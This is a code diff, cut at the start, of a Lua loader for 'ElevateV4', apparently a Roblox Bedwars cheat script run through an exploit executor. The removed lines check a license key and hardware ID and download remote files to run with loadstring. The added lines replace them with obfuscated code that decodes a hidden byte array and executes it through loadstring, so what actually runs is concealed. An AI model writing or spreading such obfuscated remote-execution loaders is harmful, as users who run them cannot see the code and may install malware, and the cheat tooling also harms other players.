-		local trimmed = body:match("^%s*(.-)%s*$")
-		if trimmed and #trimmed > 0 then
-			return trimmed
-		end
-	end
-	return nil
-end
-
-local function getHwid()
-	if gethwid then
-		local ok, id = pcall(gethwid)
-		if ok and id then return tostring(id) end
-	end
-	return analyticsService:GetClientId()
-end
-
-local scriptKey = resolveKey()
-
--- Skip auth if already authenticated this session (teleport re-exec sets this).
-local alreadyAuthed = getgenv()._elevateAuthed == true and type(scriptKey) == "string" and #scriptKey > 0
-
-if not alreadyAuthed then
-	if not scriptKey then
-		localPlayer:Kick("[Elevate] No key provided.")
-		task.wait(9e9)
-		return
-	end
-
-	local ok, response = pcall(request, {
-		Url = AUTH_URL,
-		Method = "POST",
-		Headers = {["Content-Type"] = "application/json"},
-		Body = HttpService:JSONEncode({key = scriptKey, hwid = getHwid(), game = "bedwars"}),
-	})
-
-	if not ok or not response or not response.Body then
-		localPlayer:Kick("[Elevate] Auth server unreachable.")
-		task.wait(9e9)
-		return
-	end
-
-	local decoded, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
-	if not decoded or type(data) ~= "table" then
-		localPlayer:Kick("[Elevate] Auth error " .. tostring(response.StatusCode))
-		task.wait(9e9)
-		return
-	end
-
-	if not data.success then
-		if response.StatusCode == 429 then
-			warn("[Elevate] Too many attempts, wait a moment.")
-			return
-		end
-		localPlayer:Kick("[Elevate] Invalid key: " .. tostring(data.message))
-		task.wait(9e9)
-		return
-	end
-end
-
--- Propagate key so teleport re-exec and main.lua both find it.
-getgenv().script_key = scriptKey
-getgenv().ElevateKey = scriptKey
-_G.script_key = scriptKey
-getgenv()._elevateAuthed = true
-shared.ElevateV4Key = scriptKey
-License.Key = scriptKey
-
-pcall(function()
-	EnsureFolder(`{Directory}/profiles`)
-	writefile(`{Directory}/profiles/script_key.txt`, scriptKey)
+  
+  -- execute
+  local llO0I0OIlIlIlI0I={}
+  for OlI0l0l0O00l=1,#IO0OII00IIll do llO0I0OIlIlIlI0I[OlI0l0l0O00l]=string.char(IO0OII00IIll[OlI0l0l0O00l]) end
+  local lOI0I0lIlI0I0=loadstring or load
+  assert(type(lOI0I0lIlI0I0)=="function","loadstring unsupported")
+  local OO0OI0llI,IlOI0IIl=lOI0I0lIlI0I0(table.concat(llO0I0OIlIlIlI0I))
+  assert(OO0OI0llI,tostring(IlOI0IIl))
+  OO0OI0llI()
 end)
-
--- Original ElevateV4 bootstrap below.
-if not shared.ElevateDeveloper then
-	local function Fetch(Path)
-		return game:HttpGet(RawBase .. Path, true)
-	end
-
-	local ManifestOk, ManifestText = pcall(Fetch, "manifest.json")
-	if not ManifestOk or type(ManifestText) ~= "string" then
-		error("ElevateV4: unable to read manifest.json from GitHub.")
-	end
-
-	local DecodeOk, Manifest = pcall(HttpService.JSONDecode, HttpService, ManifestText)
-	if not DecodeOk or typeof(Manifest) ~= "table" or typeof(Manifest.files) ~= "table" then
-		error("ElevateV4: manifest.json is invalid.")
-	end
-
-	local VersionOk, Version = pcall(Fetch, "version.txt")
-	if not VersionOk or type(Version) ~= "string" then
-		error("ElevateV4: unable to read version.txt from GitHub.")
-	end
-	Version = Version:gsub("%s+$", "")
-
-	local CommitPath = `{Directory}/profiles/commit.txt`
-	local IsNewUser = not isfile(CommitPath)
-	local CachedVersion = IsNewUser and "" or readfile(CommitPath)
-
-	if IsNewUser or CachedVersion ~= Version then
-		local Failed = {}
-		local Jobs = {}
-
-		-- Files that should never be overwritten or downloaded from the manifest.
-		-- init.lua overwrites itself mid-run causing corruption; profile files are
-		-- user-specific and not on GitHub for new installs.
-		local SkipPatterns = {
-			"^init%.lua$",
-			"^profiles/",
-			"^packages%.json$",
-		}
-
-		local function ShouldSkip(RelativePath)
-			for _, Pattern in SkipPatterns do
-				if RelativePath:match(Pattern) then
-					return true
-				end
-			end
-			return false
-		end
-
-		-- Prepare directories before starting workers so concurrent downloads
-		-- never race while creating the same parent folder.
-		for _, RelativePath in Manifest.files do
-			if type(RelativePath) ~= "string" or RelativePath == "" then
-				continue
-			end
-			if ShouldSkip(RelativePath) then
-				continue
-			end
-
-			local Target = `{Directory}/{RelativePath}`
-			EnsureParent(Target)
-			table.insert(Jobs, {Path = RelativePath, Target = Target})
-		end
-
-		-- Fetch manifest entries concurrently using a mutex-safe job queue.
-		-- Using a table as a queue with a pointer avoids the race condition
-		-- where multiple workers could read the same NextJob value before
-		-- incrementing it.
-		local MaxConcurrentDownloads = 8
-		local Results = table.create(#Jobs)
-		local JobQueue = {}
-		for i, Job in ipairs(Jobs) do
-			JobQueue[i] = {Index = i, Job = Job}
-		end
-		local QueuePos = 0
-		local QueueLock = false
-
-		local function DequeueJob()
-			-- Spin-wait on lock (single-threaded Luau coroutines make this safe;
-			-- only one coroutine runs at a time so this never actually spins).
-			while QueueLock do
-				task.wait()
-			end
-			QueueLock = true
-			QueuePos += 1
-			local Entry = JobQueue[QueuePos]
-			QueueLock = false
-			return Entry
-		end
-
-		local Completed = 0
-		local TotalJobs = #Jobs
-		local WorkerCount = math.min(MaxConcurrentDownloads, TotalJobs)
-
-		if TotalJobs > 0 then
-			for _ = 1, WorkerCount do
-				task.spawn(function()
-					while true do
-						local Entry = DequeueJob()
-						if not Entry then
-							break
-						end
-
-						local JobIndex = Entry.Index
-						local Job = Entry.Job
-
-						local Ok, Contents
-						for Attempt = 1, 3 do
-							Ok, Contents = pcall(Fetch, Job.Path)
-							if Ok and type(Contents) == "string" and Contents ~= "404: Not Found" then
-								break
-							end
-							if Attempt < 3 then
-								task.wait(0.25 * Attempt)
-							end
-						end
-
-						Results[JobIndex] = {
-							Ok = Ok and type(Contents) == "string" and Contents ~= "404: Not Found",
-							Contents = Contents,
-						}
-						Completed += 1
-					end
-				end)
-			end
-
-			-- Timeout guard: don't hang forever if workers stall.
-			local WaitStart = os.clock()
-			while Completed < TotalJobs do
-				if os.clock() - WaitStart > 120 then
-					warn("ElevateV4: download timed out after 120s.")
-					break
-				end
-				task.wait()
-			end
-		end
-
-		-- Write results on the main thread in manifest order. Only mark the
-		-- version as installed when every file was fetched and written.
-		for JobIndex, Job in ipairs(Jobs) do
-			local Result = Results[JobIndex]
-			if Result and Result.Ok then
-				local WriteOk = pcall(writefile, Job.Target, Result.Contents)
-				if not WriteOk then
-					table.insert(Failed, Job.Path)
-				end
-			else
-				table.insert(Failed, Job.Path)
-			end
-		end
-
-		if #Failed == 0 then
-			EnsureParent(CommitPath)
-			writefile(CommitPath, Version)
-			shared.updated = CachedVersion ~= "" and CachedVersion or nil
-		else
-			warn(`ElevateV4 update incomplete ({#Failed} file(s)); the previous cached build was kept where possible.`)
-			warn(table.concat(Failed, ", "))
-		end
-	end
-end
-
-local MainPath = `{Directory}/main.lua`
-if not isfile(MainPath) then
-	local Source = game:HttpGet(RawBase .. "main.lua", true)
-	writefile(MainPath, Source)
-end
-
-return loadstring(readfile(MainPath), "ElevateV4-main")(License)
+if not OlO0OO0IOO then error(tostring(lI0llIlII)) end
